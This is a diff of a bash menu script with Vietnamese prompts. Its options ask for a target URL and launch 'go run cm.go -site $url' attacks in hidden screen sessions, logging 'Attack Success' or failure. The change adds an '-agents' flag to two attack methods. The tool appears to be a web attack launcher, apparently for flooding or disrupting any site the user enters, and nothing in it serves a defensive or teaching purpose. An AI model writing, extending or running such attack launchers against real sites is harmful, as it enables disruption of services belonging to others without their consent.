@@ -35,7 +35,7 @@ while true; do
         2)
             read -p "Nhập URL: " url
             screen -dmS attack_method_2 bash -c "
-                go run cm.go -site \"$url\" -hetb -safe
+                go run cm.go -site \"$url\" -agents -hetb -safe
                 if [ $? -eq 0 ]; then
                     echo 'Attack Success (Method 2)' > attack_2.log
                 else
@@ -47,7 +47,7 @@ while true; do
         3)
             read -p "Nhập URL: " url
             screen -dmS attack_method_3 bash -c "
-                go run cm.go -site \"$url\" -safe
+                go run cm.go -site \"$url\" -agents -safe
                 if [ $? -eq 0 ]; then
                     echo 'Attack Success (Method 3)' > attack_3.log
                 else
